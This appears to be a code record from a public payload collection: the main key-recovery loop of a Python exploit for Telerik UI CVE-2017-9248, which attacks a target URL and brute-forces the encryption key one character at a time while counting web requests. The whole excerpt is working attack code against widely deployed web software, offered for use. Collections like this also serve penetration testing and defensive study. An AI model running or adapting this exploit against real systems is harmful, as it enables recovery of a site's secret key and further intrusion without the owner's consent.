{
    "code": "def get_key(session):\n    global char_requests\n    found = ''\n    unprintable = False\n\n    key_length = args.key_len\n    key_charset = args.charset\n    if key_charset == 'all':\n        unprintable = True\n        key_charset = ''\n        for i in range(256):\n            key_charset += chr(i)\n    else:\n        if key_charset == 'hex':\n            key_charset = '01234567890ABCDEF'\n\n    print(\"Attacking \" + args.url)\n    print(\n        \"to find key of length [\" +\n        str(key_length) +\n        \"] with accuracy threshold [\" +\n        str(args.accuracy) +\n        \"]\"\n    )\n    print(\n        \"using key charset [\" +\n        (\n            key_charset\n            if unprintable is False\n            else '- all ASCII -'\n        ) +\n        \"]\\n\"\n    )\n    for i in range(int(key_length)):\n        pos_str = (\n            str(i + 1)\n            if i > 8\n            else \"0\" + str(i + 1)\n        )\n        sys.stdout.write(\"Key position \" + pos_str + \": (------\")\n        sys.stdout.flush()\n        keychar = test_keypos(key_charset, unprintable, found, session)\n        if keychar is not False:\n            found = found + keychar\n            sys.stdout.write(\n                          \"\\b\"*7 + \"{\" +\n                          (\n                              keychar\n                              if unprintable is False\n                              else '0x' + binascii.hexlify(keychar.encode()).decode()\n                          ) +\n                          \"} found with \" +\n                          str(char_requests) +\n                          \" requests, total so far: \" +\n                          str(requests_sent) +\n                          \"\\n\"\n                      )\n            sys.stdout.flush()\n            char_requests = 0\n        else:\n            sys.stdout.write(\"\\b\"*7 + \"Not found, quitting\\n\")\n            sys.stdout.flush()\n            break\n    if keychar is not False:\n        print(\"Found key: \" +\n              (\n                found\n                if unprintable is False\n                else \"(hex) \" + binascii.hexlify(found.encode()).decode()\n              )\n              )\n    print(\"Total web requests: \" + str(requests_sent))\n    return found",
    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
    "file": "CVE Exploits/Telerik CVE-2017-9248.py",
    "license": "MIT",
    "language": "python"
}